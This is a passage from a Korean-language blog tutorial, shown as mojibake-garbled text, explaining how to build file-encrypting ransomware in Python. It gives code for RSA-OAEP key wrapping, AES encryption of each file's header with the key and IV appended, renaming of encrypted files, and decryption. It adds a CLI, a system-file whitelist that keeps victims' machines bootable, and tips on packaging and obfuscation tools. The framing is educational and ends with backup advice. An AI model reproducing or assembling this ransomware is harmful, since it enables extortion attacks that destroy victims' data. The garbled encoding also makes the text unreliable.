ë§ˆ)í•˜ë©´ ëœì„¬ì›¨ì–´ê°€ ë³µí˜¸í™”ë  ìˆ˜ë„ ìˆë‹¤.  ìš°ë¦¬ëŠ” ì˜ ì•Œë ¤ì§„ ë¼ì´ë¸ŒëŸ¬ë¦¬ <a href="https://pypi.org/project/pycryptodome/">pycryptodome</a>ê³¼ <a href="https://docs.python.org/3/library/secrets.html">secrets</a>ë¥¼ ì‚¬ìš©í•  ê²ƒì´ë‹¤.</p><blockquote><p>Note: ì‹¤ì œë¡œ ë¹„ëŒ€ì¹­+ëŒ€ì¹­ ì•”í˜¸í™”ë¥¼ ê²°í•©í•œ wrapperê°€ ìˆì§€ë§Œ ê°œë…ì„ ì„¤ëª…í•˜ê¸° ìœ„í•´ pycryptodomeì„ ì‚¬ìš©í•´ ê° ê¸°ëŠ¥ì„ êµ¬í˜„í•  ê²ƒì´ë‹¤.</p></blockquote><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png"></p><h1 id="í•„ìš”í•œ-ê¸°ëŠ¥-ìš”ì•½"><a href="#í•„ìš”í•œ-ê¸°ëŠ¥-ìš”ì•½" class="headerlink" title="í•„ìš”í•œ ê¸°ëŠ¥ ìš”ì•½"></a>í•„ìš”í•œ ê¸°ëŠ¥ ìš”ì•½</h1><ul><li><code>generate32ByteKey()</code>: ëœë¤í•œ 32ë°”ì´íŠ¸ í‚¤ë¥¼ ìƒì„±í•œë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ìˆë‹¤. <code>/dev/urandom</code>ì—ì„œ ë¬¸ìì—´ì„ ê¸ì–´ì™€ì„œ <code>sha256sum</code>ì„ í•˜ë©´ ë˜ì§€ë§Œ ë¦¬ëˆ…ìŠ¤ì— í•œì •ì ì´ë©° í¬ë¡œìŠ¤ í”Œë«í¼ìœ¼ë¡œ ë§Œë“¤ê³  ì‹¶ìœ¼ë¯€ë¡œ secrets ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•  ê²ƒì´ë‹¤. <code>secrets.token_hex(32)</code>ë¥¼ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</li><li><code>rsaEncryptSecret(string, publicKey)</code>: public keyë¥¼ ê°€ì§€ê³  secretì„ ë¹„ëŒ€ì¹­ ì•”í˜¸í™”í•œë‹¤(private keyë¥¼ í†µí•´ì„œë§Œ ë³µí˜¸í™”ë¨). ì´ë ‡ê²Œ í•˜ë©´ ê° íŒŒì¼ì— ëŒ€í•´ ìƒì„±ëœ ëŒ€ì¹­ í‚¤ë¥¼ publicKeyë¡œ ì•”í˜¸í™”í•  ìˆ˜ ìˆë‹¤. í´ë¼ì´ì–¸íŠ¸ëŠ” ê° íŒŒì¼ì˜ ëŒ€ì¹­ í‚¤ë¥¼ ë³µí˜¸í™”í•˜ë ¤ë©´ ìš°ë¦¬ì˜ private keyê°€ í•„ìš”í•˜ë‹¤.</li><li><code>rsaDecryptSecret(secret, privateKey)</code>: private ë¹„ëŒ€ì¹­ í‚¤ë¥¼ í†µí•´ ì•”í˜¸í™”ëœ ëŒ€ì¹­í‚¤ë¥¼ ë³µí˜¸í™”í•œë‹¤.</li><li><code>symEncryptFile(publicKey, file)</code>: ì•”í˜¸í™” ë¡œì§ì„ í¬í•¨í•˜ë¯€ë¡œ ê°€ì¥ ë³µì¡í•œ ë¶€ë¶„ì´ë‹¤. ì•„ë˜ì— ìì„¸íˆ ì„¤ëª…í•  ê±°ì§€ë§Œ, ì´ë¦„ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë“¯ì´ íŒŒì¼ì„ ì•”í˜¸í™”í•˜ëŠ” í•¨ìˆ˜ë‹¤.</li><li><code>symDecryptFile(privateKey, file)</code>: íŒŒì¼ì„ ë³µí˜¸í™”í•œë‹¤.</li><li><code>symEncryptDirectory(publicKey, dir)</code>: íŒŒë¼ë¯¸í„°ë¡œ ë””ë ‰í„°ë¦¬ë¥¼ ë°›ì•„ì„œ ë‚´ë¶€ì— ìˆëŠ” ëª¨ë“  íŒŒì¼ì„ ê°€ì ¸ì˜¨ë‹¤. ê·¸ í›„ <code>symEncryptFile</code>ë¥¼ í˜¸ì¶œí•œë‹¤.</li><li><code>symDecryptDirectory(privateKey, dir)</code>: <code>symEncryptDirectory</code>ì™€ ë¹„ìŠ·í•˜ì§€ë§Œ ë°˜ëŒ€ì˜ ê¸°ëŠ¥ì„ í•œë‹¤.</li></ul><h1 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h1><p>RSAë¥¼ í†µí•´ secret keyë¥¼ ì•”í˜¸í™”í•  ê²ƒì´ë‹¤. RSAëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ëœë¤ì„± ì—†ì´ ì•”í˜¸í™” ë˜ë¯€ë¡œ ê¸°ë³¸ì ì¸ RSAì— ëœë¤ì„±ê³¼ <a href="https://en.wikipedia.org/wiki/Trapdoor_function">one-way permutation trapdoor</a>ë¥¼ ì¶”ê°€í•œ padding schemeì¸ <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding(OAEP)</a>ë¥¼ ì‚¬ìš©í•  ê²ƒì´ë‹¤. OAEPì™€ ê°™ì´ RSAë¥¼ ì‚¬ìš©í•  ë•Œ ê²°ê³¼ cypher í¬ê¸°ëŠ” modulus(<code>key size/8</code>)ê³¼ ê°™ì•„ì•¼ í•œë‹¤. 2048bit RSAë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ 256 bytesì˜ resulting cyphertextê°€ ë‚˜ì™€ì•¼ í•œë‹¤.</p><p>ì´ì— ëŒ€í•œ ê°„ë‹¨í•œ ì˜ˆì œ ì½”ë“œì´ë‹¤.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):</span>  public_key = get_key(publicKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(public_key)  <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span>  bytestrings = str.encode(string)  cipher_text = cipher_rsa.encrypt(bytestrings)  <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span>  <span class="hljs-comment"># We&#x27;ll base64 encode it for convenience</span>  <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span>  <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)</code></pre><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png"></p><p>Source: <a href="https://stackoverflow.com/questions/13378815/base64-length-calculation">https://stackoverflow.com/questions/13378815/base64-length-calculation</a></p><h1 id="RsaDecryptSecret"><a href="#RsaDecryptSecret" class="headerlink" title="RsaDecryptSecret"></a>RsaDecryptSecret</h1><p>ì œê³µëœ secret keyë¡œ cipher textë¥¼ ë³µí˜¸í™”í•œë‹¤.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):</span>  <span class="hljs-comment"># We firts import the private Key</span>  private_key = get_key(privateKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Decode the base64 encoded string</span>  base64DecodedSecret = base64.b64decode(string)  <span class="hljs-comment"># create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(private_key)  <span class="hljs-comment"># Decrypt the content</span>  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)  <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span>  decryptedSecret = decryptedBytestrings.decode()  <span class="hljs-keyword">return</span> decryptedSecret</code></pre><h1 id="SymEncryptFile"><a href="#SymEncryptFile" class="headerlink" title="SymEncryptFile"></a>SymEncryptFile</h1><p>ì£¼ìš” ì•”í˜¸í™” í•¨ìˆ˜ì´ë©° ë‹¤ìŒê³¼ ê°™ì´ ë™ì‘í•œë‹¤.</p><ol><li><p>publicKeyì™€ file pathë¥¼ íŒŒë¼ë¯¸í„°ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symEncryptFile</span>(<span class="hljs-params">publicKey, file</span>):</span></code></pre></li><li><p>íŠ¹ì • íŒŒì¼ì— ëŒ€í•œ ëœë¤ í‚¤ë¥¼ ìƒì„±í•œë‹¤.</p> <pre><code class="hljs python">key = generateKey()</code></pre></li><li><p>publicKeyë¡œ ëœë¤ í‚¤ë¥¼ ì•”í˜¸í™”í•œë‹¤.</p> <pre><code class="hljs python">encryptedKey = rsaEncryptSecret(key, publicKey)</code></pre></li><li><p>íŒŒì¼ì— ëŒ€í•œ ì•”í˜¸í™” ì‚¬ì´ì¦ˆ(n byte)ë¥¼ ì •ì˜í•œë‹¤. ì˜ˆì‹œë¡œ 1MBë¥¼ ì‚¬ìš©í•œë‹¤.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>íŒŒì¼ì´ ì´ë¯¸ ì•”í˜¸í™”ë˜ì—ˆëŠ”ì§€ í™•ì¸í•œë‹¤. ì´ë¯¸ ë˜ì–´ìˆì„ ê²½ìš° ë¬´ì‹œí•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswitch(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):print(<span class="hljs-string">&#x27;File is already encrypted, skipping&#x27;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>íŒŒì¼ì˜ ì²« n ë°”ì´íŠ¸ë¥¼ ì•”í˜¸í™”í•˜ê³  contentë¥¼ overwrite í•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span>input_file = open(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)print(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)output_file = open(file + <span class="hljs-string">&#x27;.&#x27;</span> + cryptoName, <span class="hljs-string">&#x27;w+b&#x27;</span>)<span class="hljs-comment"># Create the cipher object and encrypt the data</span>cipher_encrypt = AES.new(key, AES.MODE_CFB)<span class="hljs-comment"># Encrypt file first</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)ciphered_bytes = cipher_encrypt.encrypt(buffer)input_file.seek(<span class="hljs-number">0</span>)input_file.write(ciphered_bytes)</code></pre><p> <img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png"></p></li><li><p>íŒŒì¼ì˜ ëì— ì•”í˜¸í™”ëœ ëœë¤ í‚¤ë¥¼ ì¶”ê°€í•œë‹¤.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(encryptedKey.encode())</code></pre></li><li><p>íŒŒì¼ì˜ ëì— AES IV(initialization vector)ë¥¼ ì¶”ê°€í•œë‹¤.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(cipher_encrypt.iv)</code></pre></li><li><p>ì•”í˜¸í™”ê°€ ëœ ì§€ ì‹ë³„í•  ìˆ˜ ìˆë„ë¡ ì´ë¦„ì„ ë°”ê¾¼ë‹¤.</p> <pre><code class="hljs python">input_file.close()  os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)</code></pre></li></ol><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png"></p><blockquote><p>ì•”í˜¸í™” í›„ ëŒ€ëµì ì¸ íŒŒì¼ êµ¬ì¡°</p></blockquote><p>ì „ì²´ íŒŒì¼ì„ ë³µì‚¬í•  í•„ìš”ê°€ ì—†ì—ˆë˜ ê²ƒì„ ìƒê°í•´ë¼. file objectë¥¼ í†µí•´ <code>seek()</code> ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ë°”ì´íŠ¸ë¥¼ íƒìƒ‰í•˜ê³  ë¹ ë¥´ê²Œ ì‘ì—…ì„ ì§„í–‰í•  ìˆ˜ ìˆë‹¤. ì´ëŠ” ë³µí˜¸í™” í•¨ìˆ˜ì—ì„œë„ ì‚¬ìš©ëœë‹¤.</p><p>ë˜ ì•”í˜¸í™”ëœ íŒŒì¼ì— AES IVì™€ ì•”í˜¸í™”ëœ í‚¤ë¥¼ ëª¨ë‘ ì¶”ê°€í•˜ê¸° ë•Œë¬¸ì— ê° íŒŒì¼ì— ëŒ€í•œ í‚¤ê°€ ì¡´ì¬í•˜ëŠ” í…ìŠ¤íŠ¸ íŒŒì¼ì€ í•„ìš” ì—†ë‹¤. victimì€ ìš°ë¦¬ì—ê²Œ ì–´ë–¤ íŒŒì¼ì´ë“  ë³´ë‚¼ ìˆ˜ ìˆê³  íŠ¹ì •í•œ ë°”ì´ë„ˆë¦¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” private keyë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©´ ìš°ë¦¬ëŠ” ë³µí˜¸í™”í•  ìˆ˜ ìˆë‹¤.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png"></p><h1 id="SymDecryptFile"><a href="#SymDecryptFile" class="headerlink" title="SymDecryptFile"></a>SymDecryptFile</h1><p>ì£¼ìš” ë³µí˜¸í™” í•¨ìˆ˜ì´ë©° ë‹¤ìŒê³¼ ê°™ì´ ë™ì‘í•œë‹¤.</p><ol><li><p>privateKeyì™€ file pathë¥¼ íŒŒë¼ë¯¸í„°ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symDecryptFile</span>(<span class="hljs-params">privateKey, file</span>):</span></code></pre></li><li><p>íŒŒì¼ì— ëŒ€í•œ decryption size(n ë°”ì´íŠ¸, ì•”í˜¸í™”ì—ì„œ ì“´ ê²ƒê³¼ ë™ì¼)ë¥¼ ì •ì˜í•´ë¼. ì˜ˆì‹œëŠ” 1MBì´ë‹¤.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>í™•ì¥ìë¥¼ í†µí•´ ì•”í˜¸í™” ì—¬ë¶€ë¥¼ í™•ì¸í•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):out_filename = file[:-(len(cryptoName) + <span class="hljs-number">1</span>)]print(<span class="hljs-string">&quot;Decrypting file: &quot;</span> + file)<span class="hljs-keyword">else</span> :print(<span class="hljs-string">&#x27;File is not encrypted&#x27;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>íŒŒì¼ì„ ì—´ì–´ AES IV(ë§ˆì§€ë§‰ 16ë°”ì´íŠ¸)ë¥¼ ì½ì–´ì˜¨ë‹¤.</p> <pre><code class="hljs python">input_file = open(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)<span class="hljs-comment"># Read in the iv</span>input_file.seek(<span class="hljs-number">-16</span>, os.SEEK_END)iv = input_file.read(<span class="hljs-number">16</span>)</code></pre></li><li><p>ì•”í˜¸í™”ëœ ë³µí˜¸í™” í‚¤ë¥¼ ì½ì–´ì˜¨ë‹¤.</p> <pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bbytes before the end of file</span><span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)<span class="hljs-comment"># And we read the 258 bytes of the key</span>secret = input_file.read(<span class="hljs-number">258</span>)</code></pre></li><li><p>private keyë¥¼ ê°€ì§€ê³  ì•”í˜¸í™”ëœ í‚¤ë¥¼ ë³µí˜¸í™”í•œë‹¤.</p> <pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)</code></pre></li><li><p>ì´ì „ì— ì •ì˜í•œ aes-encrypted buffer sizeë¥¼ ë³µí˜¸í™”í•˜ê³  íŒŒì¼ì˜ ì²« ë¶€ë¶„ì— ì‘ì„±í•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)<span class="hljs-comment"># Read the encrypted header</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)<span class="hljs-comment"># Decrypt the header with the key</span>decrypted_bytes = cipher_encrypt.decrypt(buffer)<span class="hljs-comment"># Write the decrypted text on the same file</span>input_file.seek(<span class="hljs-number">0</span>)input_file.write(decrypted_bytes)</code></pre></li><li><p>íŒŒì¼ì˜ ë ë¶€ë¶„ì—ì„œ IVì™€ ì•”í˜¸í™”ëœ í‚¤ë¥¼ ì œê±°í•˜ê³  ì´ë¦„ì„ ë³€ê²½í•œë‹¤.</p> <pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from IV + key.</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)input_file.truncate()input_file.close()<span class="hljs-comment"># Rename the file to delete the encrypted extenstion</span>os.rename(file, out_filename)</code></pre></li></ol><h1 id="ë§ˆì§€ë§‰-ê³ ë ¤ì‚¬í•­"><a href="#ë§ˆì§€ë§‰-ê³ ë ¤ì‚¬í•­" class="headerlink" title="ë§ˆì§€ë§‰ ê³ ë ¤ì‚¬í•­"></a>ë§ˆì§€ë§‰ ê³ ë ¤ì‚¬í•­</h1><p>ëª¨ë“  í•¨ìˆ˜ ì‘ì„±ì´ ëë‚˜ë©´ ì„ íƒí•œ í´ë”ë¥¼ ì•”í˜¸í™”í•˜ê±°ë‚˜ ë³µí˜¸í™”í•  ìˆ˜ ìˆëŠ” ë°”ì´ë„ˆë¦¬ë¥¼ ë§Œë“¤ ìˆ˜ ìˆë‹¤. ì •í™•í•˜ê²Œ <code>symEncryptDirectory/symDecryptDirectory</code> í•¨ìˆ˜ë¥¼ ì½”ë”©í–ˆìœ¼ë©´ ì•”í˜¸í™”, ë³µí˜¸í™” ì¤‘ í•˜ë‚˜ë¥¼ ì„ íƒí•œ í›„ <code>.pem</code> íŒŒì¼ì„ ì „ë‹¬í•˜ê¸°ë§Œ í•˜ë©´ ëœë‹¤. main í˜¸ì¶œ ì „ì— ë°”ì´ë„ˆë¦¬ì— ì´ê²ƒê³¼ ë¹„ìŠ·í•œ ê²ƒì´ ìˆì„ ê²ƒì´ë‹¤</p><pre><code class="hljs python">parser = argparse.ArgumentParser()parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, help=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>) parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, help=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)</code></pre><p>ì˜¤ë¥˜ ê²€ì‚¬(ì•”í˜¸í™” ì‘ì—…ì— íŒŒë¼ë¯¸í„°ë¡œ public keyê°€ ì „ë‹¬ë˜ëŠ”ì§€, decryptì— private keyê°€ ìˆëŠ”ì§€ ë“±) ì™¸ì—ë„ ìš´ì˜ ì²´ì œì— ëŒ€í•œ íŒŒì¼ ë° í´ë”ë¥¼ í™”ì´íŠ¸ ë¦¬ìŠ¤íŠ¸ë¡œ ì§€ì •í•´ì•¼ í•œë‹¤. ì•”í˜¸í™”ë˜ë”ë¼ë„ ì»´í“¨í„°ëŠ” ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ë„ë¡ í•´ì•¼ í•œë‹¤. ëª¨ë“  íŒŒì¼ì„ ì•”í˜¸í™”í•œë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ë³¼ ìˆ˜ ìˆë‹¤.</p><ol><li>ì‚¬ìš©ìê°€ ë­”ê°€ ì˜ëª»ëœ ê±¸ ì•Œ ìˆ˜ ìˆë„ë¡ ì»´í“¨í„° ì‚¬ìš©ì´ ë¶ˆê°€ëŠ¥í•´ì§„ë‹¤.</li><li>ì „ë¶€ ì•”í˜¸í™”ëœ í›„, ì‹œìŠ¤í…œì´ ë¶€íŒ…ì´ ì•ˆë˜ê³  ì‚¬ìš©ìëŠ” ëœì„¬ì›¨ì–´ì— ê°ì—¼ëœ ì‚¬ì‹¤ì„ ì•Œì§€ ëª»í•œë‹¤.</li></ol><p>ì˜ˆì‹œë¡œ ë¦¬ëˆ…ìŠ¤ í™”ì´íŠ¸ ë¦¬ìŠ¤íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs ini"><span class="hljs-attr">whitelist</span> = [<span class="hljs-string">&quot;/etc/ssh&quot;</span>, <span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/etc/security/&quot;</span>, <span class="hljs-string">&quot;/boot&quot;</span>,<span class="hljs-string">&quot;/run&quot;</span>, <span class="hljs-string">&quot;/usr&quot;</span>, <span class="hljs-string">&quot;/snap&quot;</span>, <span class="hljs-string">&quot;/var&quot;</span>, <span class="hljs-string">&quot;/sys&quot;</span>, <span class="hljs-string">&quot;/proc&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;/bin&quot;</span>,<span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;known_hosts&quot;</span>, <span class="hljs-string">&quot;sshd_config&quot;</span>,<span class="hljs-string">&quot;/home/sec/.viminfo&quot;</span>, <span class="hljs-string">&#x27;/etc/crontab&#x27;</span>, <span class="hljs-string">&quot;/etc/default/locale&quot;</span>, <span class="hljs-string">&quot;/etc/environment&quot;</span>]</code></pre><p><code>.py</code> ìŠ¤í¬ë¦½íŠ¸ë¥¼ ëª¨ë“  dependencyì™€ í•¨ê»˜ ì••ì¶•í•˜ì—¬ ë‹¨ì¼ ì‹¤í–‰ íŒŒì¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆë‹¤. ì¼ì¼ì´ ì•Œë ¤ì£¼ì§„ ì•Šê² ì§€ë§Œ <a href="https://pypi.org/project/pyarmor/">pyarmor</a>ì™€ <a href="https://www.pyinstaller.org/">pyinstaller</a>ë¥¼ ì°¾ì•„ë³´ë©´ ëœë‹¤. ë˜ ì‚¬ìš©í•˜ë ¤ëŠ” ë‚œë…í™”ì— ë”°ë¼ì„œ <a href="https://github.com/Nuitka/Nuitka">Nuitka</a>ê°€ ë„ì›€ì´ ë  ìˆ˜ë„ ìˆë‹¤.</p><h1 id="ë‹¤ë¥¸-ì¢…ë¥˜ì˜-ëœì„¬ì›¨ì–´-MBR-ì•”í˜¸í™”"><a href="#ë‹¤ë¥¸-ì¢…ë¥˜ì˜-ëœì„¬ì›¨ì–´-MBR-ì•”í˜¸í™”" class="headerlink" title="ë‹¤ë¥¸ ì¢…ë¥˜ì˜ ëœì„¬ì›¨ì–´(MBR ì•”í˜¸í™”)"></a>ë‹¤ë¥¸ ì¢…ë¥˜ì˜ ëœì„¬ì›¨ì–´(MBR ì•”í˜¸í™”)</h1><p>ìš°ë¦¬ê°€ ì‚´í´ë³´ì§€ ì•Šì€ ë“œë¼ì´ë¸Œì˜ <a href="https://en.wikipedia.org/wiki/Master_boot_record">Master Boot Record</a>ë¥¼ ê°ì—¼ì‹œí‚¤ëŠ” ë‹¤ë¥¸ ì¢…ë¥˜ì˜ ëœì„¬ì›¨ì–´ê°€ ìˆë‹¤. íŒŒì¼ ì‹œìŠ¤í…œì˜ NTFS íŒŒì¼ í…Œì´ë¸”ì„ ì•”í˜¸í™”í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ë””ìŠ¤í¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ê²Œ ë§Œë“ ë‹¤. ì´ ë°©ë²•ì€ ë°ì´í„°ì˜ ì‘ì€ ë¶€ë¶„ë§Œ ì•”í˜¸í™”í•˜ë©´ ë¼ì„œ ë§¤ìš° ë¹ ë¥´ë‹¤. <a href="https://en.wikipedia.org/wiki/Petya_(malware)">Petya ëœì„¬ì›¨ì–´</a>ê°€ ì´ ì¢…ë¥˜ì˜ ì™„ë²½í•œ ì˜ˆì‹œì´ë‹¤. í•˜ì§€ë§Œ ì´ëŠ” 3ê°œì˜ ì£¼ìš”í•œ ë‹¨ì ì„ ê°€ì§€ê³  ìˆë‹¤.</p><p>ì²« ë²ˆì§¸ë¡œ OSë¥¼ ë¶€íŒ…í•  ìˆ˜ ì—†ì–´ë„ í¬ë Œì‹ ë¶„ì„ì„ í†µí•´ íŒŒì¼ì„ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤. íŒŒì¼ë“¤ì€ ì‚­ì œë˜ì§€ ì•Šê³  íŒŒì¼ í…Œì´ë¸”ì—ì„œ ì°¸ì¡°ë˜ì§€ ì•Šì„ ë  ë¿ì´ë‹¤. ì»´í“¨í„°ê°€ ì¬ë¶€íŒ… ëœ í›„ì— raw dataë¥¼ ì•”í˜¸í™” í•˜ë”ë¼ë„ victimì´ ì»´í“¨í„°ë¥¼ ë„ê³  ë””ìŠ¤í¬ë¥¼ ë¹¼ë²„ë¦¬ë©´ ì¼ë¶€ íŒŒì¼ì„ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤.</p><p>ë‘ ë²ˆì§¸ ë‹¨ì ì€ ëŒ€ë¶€ë¶„ <a href="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/">ìµœì‹  OSëŠ” GPT(GUID Partition Table)ì„ ì‚¬ìš©í•˜ì—¬ MBRì„ ë” ì´ìƒ ì“°ì§€ ì•ŠëŠ”ë‹¤</a>ëŠ” ê²ƒì´ë‹¤.</p><p>ì„¸ ë²ˆì§¸ ë‹¨ì ì€ íŒŒì¼ ì‹œìŠ¤í…œ ì˜ì¡´ì„±ì´ ë†’ê³  NTFSì²˜ëŸ¼ ë™ì‘í•˜ì§€ ì•ŠëŠ” íŒŒì¼ ì‹œìŠ¤í…œ(EXT3/EXT4, ZFS ë“±)ë„ ê³ ë ¤í•˜ê¸° ìœ„í•´ ìˆ˜ì •í•´ì•¼ í•œë‹¤ëŠ” ì ì´ë‹¤.</p><p>ì´ ë°©ë²•ì€ ë” ë§ì€ low-level technical conceptì„ ìš”êµ¬í•˜ì—¬ ì´ ê²Œì‹œê¸€ì—ì„œ ë§ì´ ì„¤ëª…í•˜ê³  ì‹¶ì§€ ì•Šë‹¤. ë˜í•œ ì´ ë°©ë²•ë¡ ì€ ë§ì´ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ”ë‹¤. í•„ìì˜ ì£¼ëª©ì ì€ ì¼ë°˜ì ì¸ ëœì„¬ì›¨ì–´ì— ëŒ€í•´ ë…ìë“¤ì´ ë” ì˜ ì´í•´í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì´ë‹¤.</p><h1 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h1><p>ëœì„¬ì›¨ì–´ë¥¼ ë°©ì§€í•˜ëŠ” ë°©ë²•ë“¤(ì¶œì²˜ë¥¼ ì•Œ ìˆ˜ ì—†ëŠ” íŒŒì¼ ì—´ì§€ ë§ê¸°, ì¸í”„ë¼ ì—…ë°ì´íŠ¸ ìœ ì§€, ì•ˆí‹° ë©€ì›¨ì–´ ì†Œí”„íŠ¸ì›¨ì–´ ì‚¬ìš©í•˜ê¸° ë“±ë“±) ì™¸ì—ë„ ì¶”ì²œí•˜ëŠ” ë°©ë²•ì€ ë°±ì—…ê³¼ ë°±ì—… ê·¸ë¦¬ê³  ë˜ ë°±ì—…ì´ë‹¤. ê³µê²©ì„ ë§‰ê¸° ìœ„í•œ ë§ì€ ì¡°ì–¸ì„ ë“£ê²Œ ë˜ê² ì§€ë§Œ í•„ìì˜ ìƒê°ì—ëŠ” ê·¸ëƒ¥ ê±¸ë¦´ ê±°ë¼ ìƒê°í•˜ê³  ë°ì´í„°ë¥¼ ì˜¤í”„ë¼ì¸ ë°±ì—…í•˜ëŠ” ê²ƒì´ë‹¤.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png"></p><p>ë‹¹ì‹ ì´ ê°ì—¼ì„ í”¼í•œë‹¤ í•´ë„ ë™ë£Œ ì§ì›ì´ ê±¸ë¦¬ë©´ ë§¤í•‘ëœ ê³µìœ  ë“œë¼ì´ë¸Œì˜ ëª¨ë“  íŒŒì¼ì´ ì•”í˜¸í™” ë  ê²ƒì´ë‹¤.</p><blockquote><p>ë§ˆì§€ë§‰ìœ¼ë¡œ ì•„ë¬´ë„ ì¶”ì²œí•˜ì§€ ì•Šì€ ë°©ë²•: ê°ì—¼ëœ ê²½ìš°, ì•”í˜¸í™”ëœ íŒŒì¼(ê°€ì¡±ì‚¬ì§„, ë¹„ë””ì˜¤ ë“±)ì„ 